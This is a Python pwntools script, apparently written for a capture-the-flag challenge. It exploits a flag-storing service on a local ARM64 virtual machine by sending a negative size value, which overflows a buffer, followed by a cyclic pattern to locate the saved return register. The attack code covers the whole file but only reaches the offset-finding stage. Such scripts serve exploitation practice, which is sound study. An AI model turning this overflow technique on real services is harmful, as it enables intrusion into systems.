#!/usr/bin/env python2

import sys
import time
import struct
from pwn import *
from pwnlib.tubes.process import process
from pwnlib.tubes.ssh import ssh
from pwnlib.util.packing import *

def read_all(r,timeout=0.1):
	ans=''
	try:
		ansTmp = r.recv(timeout=timeout)
		ans = ansTmp
		while ansTmp != '':
			ansTmp = r.recv(timeout=timeout)
			ans += ansTmp
		return ans
	except:
		return ans

def uintToSignedInt(val):
	for i in range(1,257):
		if (-i & 0xff) == val:
			return -i
	return 0

def putFlag(p, size, value):
	p.send('P\n')
	read_all(p)
	p.send(str(size) + '\n')
	read_all(p)
	# Note that serialEoT will send a 0x04 (End Of Transmission) which will be interpreted by serial driver to flush write
	# This also means this is a bad char !
	serialEoT = '\x04'
	p.send(value + serialEoT)
	resp = p.recvline()
	respSplited = resp.split('Placed')
	if len(respSplited) < 2 :
		print('Crash : ' + repr(resp))
		return 0
	print('Flag sent successfully')
	return 1

def putFlagToWin(p, size, value):
	p.send('P\n')
	read_all(p)
	p.send(str(size) + '\n')
	read_all(p)
	serialEoT = '\x04'
	p.send(value + serialEoT)

def getFlag(p, index):
	p.send('G\n')
	read_all(p)
	p.send(str(index) + '\n')
	p.recvline()
	flag = p.recvline().replace('\r\n', '')
	return flag

context.clear(arch = 'arm64')
context.log_level = 'error'
context.endian = 'little'
context.bits = 64
local=0

ip = '127.0.0.1'
p = remote(ip, 8000)

print('Waiting VM to boot...')
time.sleep(5)
print(read_all(p, 2))

print('>>>>>>>>>>> Starting exploit')

print('Send a pattern to get offset of X30')

overflowSize = 0xff
signedSize = uintToSignedInt(overflowSize)
payload = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A'

putFlagToWin(p, signedSize, payload)
print(read_all(p)) # Print answer

p.close()
exit(0)
